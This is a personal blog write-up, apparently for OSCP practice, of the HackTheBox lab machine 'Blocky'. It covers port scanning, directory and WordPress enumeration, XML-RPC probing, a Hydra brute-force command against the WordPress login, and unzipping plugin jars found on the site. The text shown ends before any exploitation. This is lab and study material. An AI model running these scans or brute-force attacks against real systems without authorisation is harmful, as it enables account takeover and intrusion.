---
layout: post
title: HackTheBox Blocky
---

Today's box on my OSCP journey is Blocky from HackTheBox.  I've been using HackTheBox for a year now and I really like it.  When you VPN in, if you need a tool, you have internet access to download/update.  It's a minopr thing but convenient when you are learning.  This box was good enumeration practice.  Here's how I thought through it.

### Disclaimer

These isn't "here's how I got root after following someone else's writeup".  The best part about the OSCP journey has been the persepctive I've gained looking at systems and thinking through them, especially coming from a blue team background.  I like to write these to help explain how I thought through the box, where I needed help, and what I learned.

## Enumeration

We are the nights who NMAP
```
nmap -A 10.10.10.37
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-26 21:15 EST
Nmap scan report for 10.10.10.37
Host is up (0.11s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp closed sophos
Device type: general purpose|WAP|specialized|storage-misc|broadband router|printer
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (94%), Asus embedded (90%), Crestron 2-Series (89%), HP embedded (89%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:linux:linux_kernel:3.4
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 or 4.2 (94%), Linux 4.2 (94%), Linux 4.4 (94%), Linux 3.13 (93%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.12 (91%), Linux 3.18 (91%), Linux 3.2 - 4.9 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

nmap -p- 10.10.10.37
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-26 21:15 EST
Nmap scan report for 10.10.10.37
Host is up (0.033s latency).
Not shown: 65530 filtered ports
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
80/tcp    open   http
8192/tcp  closed sophos
25565/tcp open   minecraft

nmap -- script vuln 10.10.10.37
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-26 21:15 EST
Failed to resolve "script".
Failed to resolve "vuln".
Nmap scan report for 10.10.10.37
Host is up (0.072s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
80/tcp   open   http
8192/tcp closed sophos

Nmap done: 1 IP address (1 host up) scanned in 12.31 seconds
```
Hmmm so it's a Linux box with FTP, SSH, and HTTP running Wordpress open.

FTP is easy to check.  Maybe anonymous login is allowed?

```
ftp 10.10.10.37
Connected to 10.10.10.37.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.10.37]
Name (10.10.10.37:root): anonymous
331 Password required for anonymous
Password:
530 Login incorrect.
Login failed.
```

Nope.  My guess is SSH is how we privesc or something, so let's move on and check out that web site.  As always, we run a directory brute force and check robots.txt.  Let's kick off gobuster and browse to the site:

> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.37 -t 25

Side bar:  I've got to get in the habit of specifying "-a" and a user agent string.  Otherwise gobuster provides the gobuster user agent, a dead give away to anyone actually looking at the logs that someone is running gobuster.

No Robots.txt, but we enumerated Apache (confirming the NMAP):

> The requested URL /robots.txt was not found on this server.
Apache/2.4.18 (Ubuntu) Server at 10.10.10.37 Port 80

![blockyhome](/images/blocky1.png)
![blockyhome](/images/blocky2.png)

The homepage doesn't have any clues other than the Worpress login link.  I give the HTML a quick look and it's definitely WordPress.

Ding!  Gobuster is done.

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.37 -t 25
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.37
[+] Threads:        25
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/26 21:20:30 Starting gobuster
===============================================================
/wiki (Status: 301)
/wp-content (Status: 301)
/plugins (Status: 301)
/wp-includes (Status: 301)
/javascript (Status: 301)
/wp-admin (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
===============================================================
2021/01/26 21:25:21 Finished
===============================================================
```

Web is looking promising.  We've got a WordPress login and a phpmyadmin login.  Wiki might be interesting.  Content might be interesting... I manually enumerate them.  Plugins is the most interesting. 

![blockyhome](/images/blocky3.png)
![blockyhome](/images/blocky4.png)

And we have something interesting navigating to plugins...

![blockyhome](/images/blocky6.png)

I download the 2 files.  I also decide to kick off my trusty wpscan to see what our angle is.  An outdated extension?  A super old version?  While we're at it, let's also kick off our old buddy Nikto.

### WordPRess Scan

```
wpscan --url http://10.10.10.37 -e ap --plugins-detection aggressive 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.11
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.10.37/ [10.10.10.37]
[+] Started: Tue Jan 26 21:25:16 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.37/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.10.10.37/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.37/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.10.37/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |  - http://10.10.10.37/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:11:17 <==================================================> (91511 / 91511) 100.00% Time: 00:11:17
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://10.10.10.37/wp-content/plugins/akismet/
 | Last Updated: 2021-01-06T16:57:00.000Z
 | Readme: http://10.10.10.37/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.1.8
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.10.37/wp-content/plugins/akismet/, status: 200
 |
 | Version: 3.3.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.37/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.37/wp-content/plugins/akismet/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jan 26 21:36:52 2021
[+] Requests Done: 91559
[+] Cached Requests: 6
[+] Data Sent: 24.032 MB
[+] Data Received: 28.355 MB
[+] Memory used: 388.098 MB
[+] Elapsed time: 00:11:35



wpscan --url http://10.10.10.37 -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.11
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.10.37/ [10.10.10.37]
[+] Started: Tue Jan 26 22:49:25 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.37/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.10.10.37/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.37/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.10.37/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |  - http://10.10.10.37/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-12-09T00:00:00.000Z
 | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <========================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jan 26 22:49:29 2021
[+] Requests Done: 54
[+] Cached Requests: 7
[+] Data Sent: 14.222 KB
[+] Data Received: 457.956 KB
[+] Memory used: 140.926 MB
[+] Elapsed time: 00:00:04
```

Sweeeeeet!  We've got a user called "notch".  And what's this XMLRPC?  That sounds like a fun rabbit hole.  

### Nikto

```
nikto -host http://10.10.10.37
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.37
+ Target Hostname:    10.10.10.37
+ Target Port:        80
+ Start Time:         2021-01-26 21:27:15 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'link' found, with contents: <http://10.10.10.37/index.php/wp-json/>; rel="https://api.w.org/"
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ /phpmyadmin/: phpMyAdmin directory found
+ Cookie wordpress_test_cookie created without the httponly flag
+ OSVDB-3268: /wp-content/uploads/: Directory indexing found.
+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information
+ /wp-login.php: Wordpress login found
+ 8016 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2021-01-26 21:32:16 (GMT-5) (301 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Nikto confirms what we already figured out.  Good job little buddy.

## XMLRPC

Now here is where I spent some time to learn something new.  XMLRPC is basically an API for WordPress.  I had never seen it before, so I had to play with it.  Of course I begin by reading up a bit on it and quickly find a tutorial: [XMLRPC Hackin](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/)

```
HTTP/1.1 200 OK
Date: Wed, 27 Jan 2021 03:04:19 GMT
Server: Apache/2.4.18 (Ubuntu)
Connection: close
Vary: Accept-Encoding
Content-Length: 4272
Content-Type: text/xml; charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

I follow the demo and have Intruder in Burp start brute forcing logins.  That reminds me that I have a wordpress page, so I start bruteforcing that with Hydra.  Use Burp to capture the login attempt to grab your parameters.

> hydra -l notch -P /usr/share/wordlists/fasttrack.txt 10.10.10.37 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.10.37%2Fwp-admin%2F:ERROR: Invalid username. Lost your password?" -t 5

## Files

While my brute force attacks run, I finally remember that I downloaded files.  I bring them to my folder for this box and run the file command: zip files.  I unzip each.

```
file griefprevention-1.11.2-3.1.1.298.jar 
griefprevention-1.11.2-3.1.1.298.jar: Zip archive data, at least v2.0 to extract

unzip BlockyCore.jar 
Archive:  BlockyCore.jar
  inflating: META-INF/MANIFEST.MF    
  inflating: com/myfirstplugin/BlockyCore.class  

unzip griefprevention-1.11.2-3.1.1.298.jar 
Archive:  griefprevention-1.11.2-3.1.1.298.jar
replace META-INF/MANIFEST.MF? [y]es, [n]o, [A]ll, [N]one, [r]ename: n
   creating: me/
   creating: me/ryanhamshire/
   creating: me/ryanhamshire/griefprevention/
  inflating: me/ryanhamshire/griefprevention/FlatFileDataStore.class  
  inflating: me/ryanhamshire/griefprevention/GriefPreventionPlugin.class  
  inflating: me/ryanhamshire/griefprevention/GriefPreventionPlugin$IgnoreMode.class  
  inflating: me/ryanhamshire/griefprevention/ItemInfo.class  
   creating: me/ryanhamshire/griefprevention/claim/
  inflating: me/ryanhamshire/griefprevention/claim/GPClaim$ClaimBuilder.class  
  inflating: me/ryanhamshire/griefprevention/claim/GPClaim.class  
  inflating: me/ryanhamshire/griefprevention/claim/GPClaimResult.class  
  inflating: me/ryanhamshire/griefprevention/claim/ClaimsMode.class  
  inflating: me/ryanhamshire/griefprevention/claim/ClaimContextCalculator.class  
  inflating: me/ryanhamshire/griefprevention/claim/GPClaimManager.class  
  inflating: me/ryanhamshire/griefprevention/GPApiProvider.class  
   creating: me/ryanhamshire/griefprevention/message/
  inflating: me/ryanhamshire/griefprevention/message/TextMode.class  
  inflating: me/ryanhamshire/griefprevention/message/Messages.class  
  inflating: me/ryanhamshire/griefprevention/message/CustomizableMessage.class  
  inflating: me/ryanhamshire/griefprevention/DataStore.class  
  inflating: me/ryanhamshire/griefprevention/ShovelMode.class  
   creating: me/ryanhamshire/griefprevention/event/
  inflating: me/ryanhamshire/griefprevention/event/GPDeleteClaimEvent.class  
  inflating: me/ryanhamshire/griefprevention/event/GPTrustClaimEvent.class  
  inflating: me/ryanhamshire/griefprevention/event/GPTransferClaimEvent.class  
  inflating: me/ryanhamshire/griefprevention/event/GPBorderClaimEvent.class  
  inflating: me/ryanhamshire/griefprevention/event/GPCreateClaimEvent.class  
  inflating: me/ryanhamshire/griefprevention/event/GPDeleteClaimEvent$Abandon.class  
  inflating: me/ryanhamshire/griefprevention/event/GPAttackPlayerEvent.class  
  inflating: me/ryanhamshire/griefprevention/event/GPClaimEvent.class  
  inflating: me/ryanhamshire/griefprevention/event/GPTrustClaimEvent$Add.class  
  inflating: me/ryanhamshire/griefprevention/event/GPTrustClaimEvent$Remove.class  
  inflating: me/ryanhamshire/griefprevention/event/GPResizeClaimEvent.class  
  inflating: me/ryanhamshire/griefprevention/GPPlayerData.class  
  inflating: me/ryanhamshire/griefprevention/MCClansApiProvider.class  
  inflating: me/ryanhamshire/griefprevention/BlockPosCache.class  
  inflating: me/ryanhamshire/griefprevention/GPFlags.class  
  inflating: me/ryanhamshire/griefprevention/IpBanInfo.class  
  inflating: me/ryanhamshire/griefprevention/GPTimings.class  
   creating: me/ryanhamshire/griefprevention/task/
  inflating: me/ryanhamshire/griefprevention/task/RestoreNatureProcessingTask.class  
  inflating: me/ryanhamshire/griefprevention/task/PvPImmunityValidationTask.class  
  inflating: me/ryanhamshire/griefprevention/task/RestoreNatureExecutionTask.class  
  inflating: me/ryanhamshire/griefprevention/task/CheckForPortalTrapTask.class  
  inflating: me/ryanhamshire/griefprevention/task/CleanupUnusedClaimsTask.class  
  inflating: me/ryanhamshire/griefprevention/task/AutoExtendClaimTask.class  
  inflating: me/ryanhamshire/griefprevention/task/VisualizationReversionTask.class  
  inflating: me/ryanhamshire/griefprevention/task/SiegeCheckupTask.class  
  inflating: me/ryanhamshire/griefprevention/task/DeliverClaimBlocksTask.class  
  inflating: me/ryanhamshire/griefprevention/task/SecureClaimTask.class  
  inflating: me/ryanhamshire/griefprevention/task/SendPlayerMessageTask.class  
  inflating: me/ryanhamshire/griefprevention/task/WelcomeTask.class  
  inflating: me/ryanhamshire/griefprevention/task/VisualizationApplicationTask.class  
  inflating: me/ryanhamshire/griefprevention/task/IgnoreLoaderThread.class  
  inflating: me/ryanhamshire/griefprevention/task/AutoExtendClaimTask$ExecuteExtendClaimTask.class  
  inflating: me/ryanhamshire/griefprevention/task/PlayerKickBanTask.class  
  inflating: me/ryanhamshire/griefprevention/DatabaseDataStore.class  
   creating: me/ryanhamshire/griefprevention/visual/
  inflating: me/ryanhamshire/griefprevention/visual/Visualization.class  
  inflating: me/ryanhamshire/griefprevention/visual/VisualizationType.class  
   creating: me/ryanhamshire/griefprevention/exception/
  inflating: me/ryanhamshire/griefprevention/exception/NoTransferException.class  
   creating: me/ryanhamshire/griefprevention/util/
  inflating: me/ryanhamshire/griefprevention/util/PlayerUtils.class  
  inflating: me/ryanhamshire/griefprevention/util/BlockUtils.class  
  inflating: me/ryanhamshire/griefprevention/util/WordFinder.class  
  inflating: me/ryanhamshire/griefprevention/util/NbtDataHelper.class  
   creating: me/ryanhamshire/griefprevention/configuration/
  inflating: me/ryanhamshire/griefprevention/configuration/IClaimData.class  
  inflating: me/ryanhamshire/griefprevention/configuration/GriefPreventionConfig.class  
  inflating: me/ryanhamshire/griefprevention/configuration/ClaimStorageData.class  
  inflating: me/ryanhamshire/griefprevention/configuration/SubDivisionDataConfig.class  
  inflating: me/ryanhamshire/griefprevention/configuration/PlayerStorageData.class  
  inflating: me/ryanhamshire/griefprevention/configuration/GriefPreventionConfig$Type.class  
  inflating: me/ryanhamshire/griefprevention/configuration/ClaimDataConfig.class  
   creating: me/ryanhamshire/griefprevention/configuration/category/
  inflating: me/ryanhamshire/griefprevention/configuration/category/SiegeCategory.class  
  inflating: me/ryanhamshire/griefprevention/configuration/category/DatabaseCategory.class  
  inflating: me/ryanhamshire/griefprevention/configuration/category/LoggingCategory.class  
  inflating: me/ryanhamshire/griefprevention/configuration/category/ConfigCategory.class  
  inflating: me/ryanhamshire/griefprevention/configuration/category/SpamCategory.class  
  inflating: me/ryanhamshire/griefprevention/configuration/category/PlayerDataCategory.class  
  inflating: me/ryanhamshire/griefprevention/configuration/category/FlagCategory.class  
  inflating: me/ryanhamshire/griefprevention/configuration/category/GeneralCategory.class  
  inflating: me/ryanhamshire/griefprevention/configuration/category/MigratorCategory.class  
  inflating: me/ryanhamshire/griefprevention/configuration/category/ClaimCategory.class  
  inflating: me/ryanhamshire/griefprevention/configuration/category/EconomyCategory.class  
  inflating: me/ryanhamshire/griefprevention/configuration/category/PvpCategory.class  
  inflating: me/ryanhamshire/griefprevention/configuration/ClaimTemplateStorage.class  
   creating: me/ryanhamshire/griefprevention/configuration/type/
  inflating: me/ryanhamshire/griefprevention/configuration/type/WorldConfig.class  
  inflating: me/ryanhamshire/griefprevention/configuration/type/DimensionConfig.class  
  inflating: me/ryanhamshire/griefprevention/configuration/type/ConfigBase.class  
  inflating: me/ryanhamshire/griefprevention/configuration/type/GlobalConfig.class  
  inflating: me/ryanhamshire/griefprevention/configuration/ClaimTemplateConfig.class  
  inflating: me/ryanhamshire/griefprevention/configuration/PlayerDataConfig.class  
   creating: me/ryanhamshire/griefprevention/command/
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimAdmin.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimFlagPlayer.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimInfo.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimClear.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimAbandon.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimBasic.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandIgnorePlayer.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimCuboid.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandTrust.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandGpReload.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandSiege.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandUntrust.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimSetSpawn.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimDeleteAllAdmin.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimFarewell.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandSetAccruedClaimBlocks.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimName.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimBuy.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimSpawn.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimSell.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandDebug.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimBanItem.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimOptionGroup.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimPermissionPlayer.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandContainerTrust.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandTrustAll.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimBook.class  
  inflating: me/ryanhamshire/griefprevention/command/BaseCommand.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandTrustList.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandClaimIgnore.class  
  inflating: me/ryanhamshire/griefprevention/command/CommandRestoreNature.class  
